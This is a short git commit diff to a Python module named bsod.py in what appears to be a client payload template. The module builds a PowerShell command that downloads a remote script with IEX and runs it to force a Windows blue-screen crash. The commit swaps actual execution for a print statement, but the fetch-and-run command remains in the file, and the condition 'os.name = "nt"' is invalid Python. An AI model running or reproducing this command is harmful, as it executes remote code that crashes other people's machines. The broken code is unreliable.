9daf53ab23c6ff292db3503024369aada7815839
Obvious Plays <111094267+ObviousTeam@users.noreply.github.com>
2024-09-17 17:30:34 -0400

    bsod safegard

--- templates/client/pem/bsod.py
+++ templates/client/pem/bsod.py
@@ -4,5 +4,5 @@ import os
 def run():
     if os.name = "nt":
         powershell_command = "IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD"
-
-        result = subprocess.run(powershell_command)
+        print(powershell_command)
+        #result = subprocess.run(powershell_command)
